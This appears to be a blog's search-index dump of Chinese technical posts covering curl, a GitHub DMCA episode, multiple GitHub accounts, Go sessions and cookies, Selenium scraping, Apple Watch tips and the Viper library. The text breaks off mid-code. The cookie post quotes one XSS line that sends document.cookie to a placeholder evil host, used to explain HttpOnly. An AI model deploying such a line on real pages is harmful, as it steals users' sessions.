使用教程\n\n##### 1.1 查看网页源码和保存\n\n```bash\ncurl www.sina.com\n```\n\n如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用wget命令了。\n\n```bash\ncurl -o [文件名] www.sina.com\n```\n\n<!-- more -->\n\n##### 1.2 显示响应头信息\n\n`-i`参数可以显示http response的头信息，连同网页代码一起。`-I`参数则是只显示http response的头信息。\n\n```bash\ncurl -i www.sina.com\n```\n\n\n\n##### 1.3 显示通信过程\n\n`-v`参数可以显示一次http通信的整个过程，包括端口连接和http request头信息。\n\n```bash\ncurl -v www.sina.com\n```\n\n如果你觉得上面的信息还不够，那么下面的命令可以查看更详细的通信过程。\n\n```bash\ncurl --trace output.txt www.sina.com\ncurl --trace-ascii output.txt www.sina.com\n```\n\n运行后，请打开output.txt文件查看。\n\n\n\n### 2. 发送数据\n\n##### 2.1 发送GET\n\nGET方法相对简单，只要把数据附在网址后面就行。\n\n```bash\ncurl example.com/form.cgi?data=xxx\n```\n\n\n\n##### 2.2 发送POST\n\nPOST方法必须把数据和网址分开，curl就要用到--data参数。\n\n```bash\ncurl -X POST --data \"data=xxx\" example.com/form.cgi\n```\n\n如果你的数据没有经过表单编码，还可以让curl为你编码，参数是`--data-urlencode`。\n\n```bash\ncurl -X POST --data-urlencode \"date=April 1\" example.com/form.cgi\n\n# 如果编码前有=号, 需要提前编码\n--data-urlencode  'value=-vf scale=-2:360'   # 错误\n--data-urlencode  'value=-vf scale%3d-2:360' # 正确\n```\n\n\n\n##### 2.3 HTTP动词\n\ncurl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。\n\n```bash\ncurl -X DELETE www.example.com\n```\n\n\n\n##### 2.4 增加头信息\n\n有时需要在http request之中，自行增加一个头信息。`--header` 或 `-H `参数就可以起到这个作用。\n\n```bash\ncurl --header \"Content-Type:application/json\" http://example.com\n```\n\n\n\n##### 2.5 HTTP认证\n\n有些网域需要HTTP认证，这时curl需要用到`--user`参数。\n\n```bash\ncurl --user name:password example.com\n```\n\n\n\n##### 2.6 cookie\n\n使用`--cookie`参数，可以让curl发送cookie。\n\n```bash\ncurl --cookie \"name=xxx\" www.example.com\n```\n\n至于具体的cookie的值，可以从http response头信息的`Set-Cookie`字段中得到。\n\n\n\n`-c cookie-file`可以保存服务器返回的cookie到文件，`-b cookie-file`可以使用这个文件作为cookie信息，进行后续的请求。\n\n```bash\ncurl -c cookies http://example.com\ncurl -b cookies http://example.com\n```\n\n\n\n##### 2.7 User Agent字段\n\n这个字段是用来表示客户端的设备信息。服务器有时会根据这个字段，针对不同设备，返回不同格式的网页，比如手机版和桌面版。\n\n```bash\ncurl --user-agent \"[User Agent]\" [URL]\n```\n\n\n\n##### 2.8 Referer字段\n\n有时你需要在http request头信息中，提供一个referer字段，表示你是从哪里跳转过来的。\n\n```bash\ncurl --referer http://www.example.com http://www.example.com\n```\n\n\n\n##### 2.9 文件上传\n\n假定文件上传的表单是下面这样：\n\n```html\n<form method=\"POST\" enctype='multipart/form-data' action=\"upload.cgi\">\n　　　　<input type=file name=upload>\n　　　　<input type=submit name=press value=\"OK\">\n　　</form>\n```\n\n你可以用curl这样上传文件：\n\n```bash\ncurl --form upload=@localfilename --form press=OK [URL]\n```\n\n\n\n##### 2.10 终极命令\n\n```bash\ncurl --help\n```\n\n","tags":["curl"],"categories":["命令"]},{"title":"近期博客的折腾命运","url":"%2Fp%2F1dd7dc05.html","content":"\n\n\n### 1. github DMCA takedown\n\n前两天, 发现blog突然无法提交了. 去邮箱里看github发的邮件才知道有一篇博文涉及到jetbrains版权问题, 让24小时内处理, 后来完美错过了时间. 就直接被takedown了.\n\n\n\n### 2. 折腾过程\n\ntakedown后一脸懵逼, 在网上查询的解决方案基本都是给github发邮件, 请求删除仓库或者再给一次宽限24小时的处理时间. \n\n于是我试着发了一封邮件, 没想到10天后才得到回复 (这效率~~~). 回复的时间还在十一假期内, 虽然又给我了24小时处理, 又被我完美错过了.(!!!!!一定要定期查看邮件)\n\n<!-- more -->\n\n于是又想到了以下三个解决方案:\n\n+ 发邮件让 github 直接删除仓库(因为是blog, 本地有备份), 然后再重新建库.\n+ 部署到其他平台 (如 coding 或 自己的服务器上)\n+ 部署到小号的 github 上\n\n\n\n为了省事, 我最后的解决方案是:\n\n1. 先发送github给予删除仓库的邮件(截至到写blog的时间, 还没有得到回复) \n\n2. 然后在小号的github上创建了仓库. 然后把本地blog提交上去. 重新把域名绑定github page即可.\n\n   \n\n   \n\n> 为什么说折腾呢!!!!!!  \n\n\n\n在小号绑定CNAME时, 提示域名CNAME被占用, 要先删除之前的域名绑定, 因为之前的仓库被takedown了无法编辑删除, 小号仓库就无法添加.  真的是无fuck说\n\n\n\n后来小号又发了一封邮件说CNAME被占用, 回复让我在域名解析里加一条TXT记录, 照做后, 几天后就可以了.\n\n\n\n### 3. 事件教训\n\n+ 一样要提高版权意识.\n\n+ 定期查看邮件, 定期查看邮件, 定期查看邮件","categories":["博客"]},{"title":"github多帐号登录的问题","url":"%2Fp%2F899d7696.html","content":"\n\n\n### 1. 同一台电脑有2个github账号？\n\n+ 首先要为每个帐号生成公钥私钥对, 并且设置到 github 里, 参考 {% post_link 2-linux系统/git/github和gitee通过密钥来进行ssh连接 %}\n\n+ 修改 `~/.ssh/config`, 设置如下\n\n```bash\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\n测试:\n```bash\nssh -T git@unix2dos\nssh -T git@levonfly\n```\n<!-- more -->\n\n+ 要修改仓库的 remote url, 对应 `~/.ssh/config` 所填写的值.  注意, 要修改 git@后面的这个值\n\n```bash\ngit remote set-url origin git@unix2dos:unix2dos/LevonRecord.git\n```\n\n\n\n- 一定要设置用户名和邮箱.否则虽然可以提交 commit, 但是不认识你是谁\n\n  \n\n- 建议 global 用一个,  其他项目用另外的用户名\n\n```bash\ngit config -l\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email \"levonfly@gmail.com\" \n\n\ngit config user.name \"levonfly\"\ngit config user.email \"6241425@qq.com\" \n```\n\n\n\n### 2. mac切换用户提交失败的问题\n\n提交总是出现permission denied的问题，用git config --global更新了username和email也不行。\n\nmac os原因是即便更新了username和email，mac在git push时还是会使用历史账号的密码。\n\n> 解决方法如下：\n\n1. 进入Keychain Access (不知道在哪儿的可以command+space查找)\n2. 在搜索框输入'git'进行查找，将找到的文件删掉，这里保存了历史账号的信息\n3. 删除之后重新用git config --global更新username和email即可，之后git push会要求你输入username和password\n4. done!\n\n\n参考: https://www.zhihu.com/question/23028445/answer/399033488\n\n\n\n\n### 3. 参考资料\n\n+ https://gist.github.com/jexchan/2351996\n+ https://www.zhihu.com/question/23028445/answer/399033488","tags":["github"],"categories":["git"]},{"title":"session的介绍和golang实战","url":"%2Fp%2F312a7a36.html","content":"\nSession是服务器端使用的一种记录客户端状态的机制，Session在用户第一次访问服务器的时候自动创建。客户端只保存sessionid到cookie中，而不会保存session，关掉浏览器并不会关闭session。\n\n<!-- more -->\n\n# 1. session 介绍\n\n### 1.1 session与cookie的区别\n\ncookie与session最大的区别就是一个是将数据存放在客户端，一个是将数据存放在服务端。\n\nsession通信的一般实现形式是通过cookie来实现，与cookie不同的是，session只会保存一个sessionID在客户端，不会像cookie那样将具体的数据保存在客户端，session具体的数据只会保存在服务端上。\n\n### 1.2 session流程\n\nSession有两个主要的东西，一个是SessionID，一个是存放在服务端对象池中的Session对象。\n\n客户端访问服务端的时候，会先判断这个客户端的请求数据中是否包含有SessionID，如果没有的话，就会认为这个客户端是第一次进行访问。\n\n因为是第一次访问，所以服务端会给客户端在对象池中创建一个Session对象（假设这个会话是需要维持的），并生成出这个对象的SessionID，接着会通过cookie将SessionID响应给客户端，同时会把Session对象放回对象池里。\n\n客户端接收响应数据后会将SessionID存放在本地，下一次再访问服务端的时候就会把SessionID给带上，服务端就能够通过SessionID获得相应的Session对象，Session就是以这样的一个机制维持会话状态的。\n\n### 1.3 session存储\n\nsession数据存储到内存是最佳的选择。最好的解决方案就是使用分布式缓存技术，例如：memcached和redis，将session信息的存储独立出来也是解决 session 同步问题的方法。\n\n\n\n### 1.4 session劫持防范\n\n其中一个解决方案就是sessionID的值只允许cookie设置，同时设置cookie的httponly为true，这个属性是设置是否可通过客户端脚本访问这个设置的cookie。第一可以防止这个cookie被XSS读取从而引起session劫持，第二cookie设置不会像URL重置方式那么容易获取sessionID。\n\n\n\n还有一个解决方案就是，我们给session额外设置一个创建时间的值，一旦过了一定的时间，我们销毁这个sessionID，重新生成新的session，这样可以一定程度上防止session劫持的问题。\n\n\n\n# 2. golang 使用 session\n\n+ https://github.com/gin-contrib/sessions\n\n```go\npackage main\n\nimport (\n\t\"github.com/gin-contrib/sessions\"\n\t\"github.com/gin-contrib/sessions/cookie\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tstore := cookie.NewStore([]byte(\"secret\"))\n\tr.Use(sessions.Sessions(\"mysession\", store))\n\n\tr.GET(\"/incr\", func(c *gin.Context) {\n\t\tsession := sessions.Default(c)\n\t\tvar count int\n\t\tv := session.Get(\"count\")\n\t\tif v == nil {\n\t\t\tcount = 0\n\t\t} else {\n\t\t\tcount = v.(int)\n\t\t\tcount++\n\t\t}\n\t\tsession.Set(\"count\", count)\n\t\tsession.Save()\n\t\tc.JSON(200, gin.H{\"count\": count})\n\t})\n\tr.Run(\":8000\")\n}\n```\n\n\n\n+ github.com/gorilla/sessions\n\n```go\n// sessions.go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/sessions\"\n)\n\nvar (\n    // key must be 16, 24 or 32 bytes long (AES-128, AES-192 or AES-256)\n    key = []byte(\"super-secret-key\")\n    store = sessions.NewCookieStore(key)\n)\n\nfunc secret(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Check if user is authenticated\n    if auth, ok := session.Values[\"authenticated\"].(bool); !ok || !auth {\n        http.Error(w, \"Forbidden\", http.StatusForbidden)\n        return\n    }\n\n    // Print secret message\n    fmt.Fprintln(w, \"The cake is a lie!\")\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Authentication goes here\n    // ...\n\n    // Set user as authenticated\n    session.Values[\"authenticated\"] = true\n    session.Save(r, w)\n}\n\nfunc logout(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Revoke users authentication\n    session.Values[\"authenticated\"] = false\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/secret\", secret)\n    http.HandleFunc(\"/login\", login)\n    http.HandleFunc(\"/logout\", logout)\n\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n\n\n```bash\n$ go run sessions.go\n\n$ curl -s http://localhost:8080/secret\nForbidden\n\n$ curl -s -I http://localhost:8080/login\nSet-Cookie: cookie-name=MTQ4NzE5Mz...\n\n$ curl -s --cookie \"cookie-name=MTQ4NzE5Mz...\" http://localhost:8080/secret\nThe cake is a lie!\n```\n\n\n\n# 3. 参考资料\n\n+ https://www.iteye.com/blog/justsee-1570652\n+ https://gowebexamples.com/sessions/\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/06.0.md\n\n\n\n","tags":["session"],"categories":["web"]},{"title":"cookie的介绍与golang实战","url":"%2Fp%2F2a7234ed.html","content":"\nCookie 是在 HTTP 协议下，由 `Web 服务器`保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。\n\nCookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。\n\n<!-- more -->\n\n# 1. cookie 介绍\n\nCookie 是服务器**保存在浏览器的**一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。\n\nCookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐。\n\n### 1.1 cookie 信息\n\n- Cookie 的名字\n- Cookie 的值（真正的数据写在这里面）\n- 到期时间\n- 所属域名（默认是当前域名）\n- 生效的路径（默认是当前网址）\n\n举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 cookie。这个 cookie 就会包含`www.example.com`这个域名，以及根路径`/`，这个 cookie 对该域名的根路径和它的所有子路径都有效。\n\n如果路径设为`/forums`，那么这个cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。 \n\n### 1.2 cookie 属性\n\n**过期相关：Expires，Max-Age**\n\n`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。\n\n```ini\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\n如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前会话结束，该 Cookie 就会被删除。\n\n另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。\n\n`Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。\n\n\n\n如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。\n\n\n\n**域名和路径：Domain，Path**\n\n`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如`www.example.com`会设为`example.com`，而且以后如果访问`example.com`的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在`Set-Cookie`字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。\n\n\n\n`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是域名必须一致。\n\n\n\n**安全相关：Secure，HttpOnly**\n\n`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。\n\n`HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。\n\n```ini\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。\n\n### 1.3 使用流程\n\n**1. 客户端开启和限制**\n\n浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。\n\n```bash\n// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true\n```\n\n`document.cookie`属性返回当前网页的 Cookie。\n\n```bash\n// 当前网页的 Cookie\ndocument.cookie\n```\n\n同浏览器对 cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 cookie 不应超过30个，每个 cookie 的大小不能超过4KB。超过限制以后，cookie 将被忽略，不会被设置。\n\n浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 cookie。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 cookie，可以被`https://example.com`读取。\n\n**2. 服务器设置cookie**\n\n服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。\n\n```ini\nSet-Cookie:foo=bar\n```\n\n上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。\n\nHTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。\n\n```ini\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。\n\n```ini\nSet-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n```\n\n一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。\n\n+ 改变cookie\n\n如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。\n\n```ini\nSet-Cookie: key1=value1; domain=example.com; path=/blog\n```\n\n改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。\n\n```ini\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n```\n\n+ 新增cookie\n\n只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。\n\n```ini\nSet-Cookie: key1=value2; domain=example.com; path=/\n```\n\n上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。\n\n```ini\nCookie: key1=value1; key1=value2\n```\n\n上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。\n\n**3. 客户端发送cookie**\n\n浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。把服务器早前保存在浏览器的这段信息，再给到服务器。这时要使用 HTTP 头信息的`Cookie`字段。\n\n```ini\nCookie: foo=bar\n```\n\n上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。`Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。\n\n```ini\nCookie: name=value; name2=value2; name3=value3\n```\n\n下面是一个例子。\n\n```ini\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n### 1.4 document.cookie\n\n`document.cookie`属性用于读写当前网页的 Cookie。\n\n读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。\n\n```js\ndocument.cookie // \"foo=bar;baz=bar\"\n```\n\n上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。\n\n```js\nvar cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n```\n\n`document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。\n\n```js\ndocument.cookie = 'fontSize=14';\n```\n\n写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。\n\n但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。\n\n```js\ndocument.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie  // test1=hello;test2=world\n```\n\n`document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。\n\n\n\n写入 Cookie 的时候，可以一起写入 Cookie 的属性。\n\n```js\ndocument.cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\";\n```\n\n\n\n上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。\n\n各个属性的写入注意点如下。\n\n- `path`属性必须为绝对路径，默认为当前路径。\n- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。\n- `max-age`属性的值为秒数。\n- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。\n\n\n\n`document.cookie`写入 Cookie 的例子如下。\n\n```ini\ndocument.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n```\n\nCookie 的属性一旦设置完成，就没有办法读取这些属性的值。\n\n删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。\n\n```ini\ndocument.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n```\n\n上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。\n\n\n\n# 2. golang 使用 cookie\n\n+ cookie的结构体如下:\n\n``` go\ntype Cookie struct {\n    Name  string\n    Value string\n\n    Path       string    // optional\n    Domain     string    // optional\n    Expires    time.Time // optional\n    RawExpires string    // for reading cookies only\n\n    // MaxAge=0 means no 'Max-Age' attribute specified.\n    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'\n    // MaxAge>0 means Max-Age attribute present and given in seconds\n    MaxAge   int\n    Secure   bool\n    HttpOnly bool\n    Raw      string\n    Unparsed []string // Raw text of unparsed attribute-value pairs\n}\n```\n\n+ cookie 操作\n\n```go\n//设置Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   3600 * 24,\n\t\tHttpOnly: true,\n\t})\n\n//读取Cookie\ncookie, err := req.Cookie(\"auth_token\")\n\n//删除Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   -1,\n\t\tHttpOnly: true,\n\t})\n```\n\n\n\n# 3. 参考资料\n\n+ https://studygolang.com/articles/5905\n\n+ https://javascript.ruanyifeng.com/bom/cookie.html\n\n","tags":["cookie"],"categories":["web"]},{"title":"爬虫利器selenium和无头浏览器的使用","url":"%2Fp%2F545fa06.html","content":"\n\n\n### 0. 前言\n\nSelenium 的初衷是打造一款优秀的自动化测试工具，但是慢慢的人们就发现，Selenium 的自动化用来做爬虫正合适。我们知道，传统的爬虫通过直接模拟 HTTP 请求来爬取站点信息，由于这种方式和浏览器访问差异比较明显，很多站点都采取了一些反爬的手段，而 Selenium 是通过模拟浏览器来爬取信息，其行为和用户几乎一样，反爬策略也很难区分出请求到底是来自 Selenium 还是真实用户。\n\n\n\n通过 Selenium 来做爬虫，不用去分析每个请求的具体参数，比起传统的爬虫开发起来更容易。Selenium 爬虫唯一的不足是慢，如果你对爬虫的速度没有要求，那使用 Selenium 是个非常不错的选择。\n\n<!-- more -->\n\n### 1. 安装和使用\n\n```bash\npip install selenium \n```\n\n\n\n##### 1.1 页面操作\n\n```python\n# 输入数据\nbrowser.find_element_by_css_selector('.rfm input[name=\"username\"]').send_keys('123456')\n\n# 选择数据\nbrowser.find_element_by_xpath(\"//select[@name='questionid']/option[text()='父亲的手机号码']\").click()\n\n# 敲回车\nbrowser.find_element_by_css_selector('button[name=\"loginsubmit\"]').send_keys(Keys.ENTER)\n\n\n# 只等3秒\nbrowser.implicitly_wait(3)\n\n# 获取cookie\ncookies_list = driver.get_cookies()\ncookies_dict = {}\nfor cookie in cookies_list:\n    cookies_dict[cookie['name']] = cookie['value']\nprint(cookies_dict)\n```\n\n\n\n### 2. 遇到的问题\n\n\n\n##### 2.1 [ImportError: cannot import name 'webdriver'](https://stackoverflow.com/questions/29092970/importerror-cannot-import-name-webdriver)\n\n文件不能命名为`selenium`\n\n\n\n##### 2.2  Message: 'chromedriver' executable needs to be in PATH.\n\n下载驱动 https://sites.google.com/a/chromium.org/chromedriver/downloads\n\n\n\n##### 2.3 Message: unknown error: cannot find Chrome binary\n\n+ centos 安装 chrome\n\n  ```bash\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm\n  sudo yum localinstall google-chrome-stable_current_x86_64.rpm\n  google-chrome --no-sandbox --version # 看到版本后去下载相关的driver\n  ```\n\n+ ubuntu 安装 chrome\n\n  ```\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n  sudo apt install ./google-chrome-stable_current_amd64.deb\ngoogle-chrome --no-sandbox --version\n  ```\n  \n  \n\n\n\n### 3. 参考资料\n\n+ https://cuiqingcai.com/2599.html\n\n+ [Python3中Selenium使用方法](https://zhuanlan.zhihu.com/p/29435831)\n\n\n+ [使用 Python + Selenium 打造浏览器爬虫](https://www.aneasystone.com/archives/2018/02/python-selenium-spider.html)","tags":["爬虫"],"categories":["爬虫"]},{"title":"applewatch使用软件和问题","url":"%2Fp%2Ff8321ea6.html","content":"\n# 1. 常用软件\n\n### 1.1 健康类\n\n+ autosleep 睡眠。 25元买断终身，可以和heartwatch一起购买，一共50元。\n\n+ heart watch / heart analyzer  心率分析。\n\n+ keep 跑步。\n\n<!-- more -->\n\n### 1.2 功能类\n\n+ 彩云天气\n\n\n\n# 2. 功能使用\n\n### 2.1 watch截图\n\n+ 在 iPhone 上打开「Watch」应用。    轻点「我的手表」标签页，然后选择「通用」 向下滑动，选择开启「启用截屏」\n+ 双指同时按下数码表冠和侧边按钮就可以为 Apple Watch 截屏。截图成功后，图片会自动同步保存到配对的 iPhone 相册中 。\n\n### 2.2 健身记录设置\n\n按下表冠进入APP列表，打开健身记录APP，划到最下方，更改目标。\n\nApple Watch 的「健身记录」由【红色：活动】，【绿色：锻炼】，【蓝色：站立】组成。\n\n+ 红色：达成你的动态卡路里消耗目标，就能填满活动圆环。\n\n  你上班时走的那几步楼梯、陪孩子玩耍、干家务时的活动量，无不涵盖其中。\n\n+ 绿色：进行至少 30 分钟强度不低于快走的运动，就能填满锻炼圆环。\n\n  无论你是快步行走，还是进行体能训练 app 内的某项运动，都包括在内。\n\n+ 蓝色：在一天中的 12 个小时里，每小时都至少起身活动 1 分钟，就能填满站立圆环。\n\n\n\n# 3. 常见问题\n\n### 3.1 个别程序安装不上\n\n选择去手表的appstore 下载。\n\n### 3.2  复杂功能没有海拔高度\n\n1. 仅限 Apple Watch SE 和 Apple Watch Series 6以上。\n2. 有可能是手机把指南针卸载了，需要重新安装一下指南针。\n\n\n\n# 4. 表盘\n\n### 4.1  太阳表盘\n\n左上：电量\n\n右上：今日日期\n\n左下：闹钟\n\n右下：气温\n\n### 4.2 图文模块\n\n左上：数字秒针\n\n日期：23周五\n\n中间：脉搏曲线图（heart watch）\n\n左下：海拔高度\n\n底部居中：指南针\n\n右下：脉搏图表（heart watch）\n\n","tags":["applewatch"],"categories":["watch"]},{"title":"golang配置信息库viper的使用","url":"%2Fp%2Fe2f28eb4.html","content":"\n### 0. 前言\n\nViper(毒蛇)是一个方便Go语言应用程序处理配置信息的库。它可以处理多种格式的配置。它支持的特性：\n\n- 设置默认值\n- 从JSON，TOML，YAML，HCL和Java属性配置文件中读取\n- 实时观看和重新读取配置文件（可选）\n- 从环境变量中读取\n- 从远程配置系统（etcd或Consul）读取，并观察变化\n- 从命令行标志读取\n- 从缓冲区读取\n- 设置显式值\n\n<!-- more -->\n\nViper读取配置信息的优先级顺序，从高到低，如下：\n\n- 显式调用Set函数\n- 命令行参数\n- 环境变量\n- 配置文件\n- key/value 存储系统\n- 默认值\n\nViper 的配置项的key不区分大小写。\n\n\n\n### 1. 安装使用\n\n##### 1.0 安装\n\n```bash\ngo get -u github.com/spf13/viper\n```\n\n\n\n##### 1.1 设置默认值\n\n默认值不是必须的，如果配置文件、环境变量、远程配置系统、命令行参数、Set函数都没有指定时，默认值将起作用。\n\n```go\nviper.SetDefault(\"ContentDir\", \"content\")\nviper.SetDefault(\"LayoutDir\", \"layouts\")\nviper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"})\n```\n\n\n\n##### 1.2 读取配置文件\n\nViper支持JSON、TOML、YAML、HCL和Java properties文件。\nViper可以搜索多个路径，但目前单个Viper实例仅支持单个配置文件。\nViper默认不搜索任何路径。\n以下是如何使用Viper搜索和读取配置文件的示例。\n路径不是必需的，但最好至少应提供一个路径，以便找到一个配置文件。\n\n```go\nviper.SetConfigName(\"config\") //  设置配置文件名 (不带后缀)\nviper.AddConfigPath(\"/etc/appname/\")   // 第一个搜索路径\nviper.AddConfigPath(\"$HOME/.appname\")  // 可以多次调用添加路径\nviper.AddConfigPath(\".\")               // 比如添加当前目录\nerr := viper.ReadInConfig() // 搜索路径，并读取配置数据\nif err != nil {\n    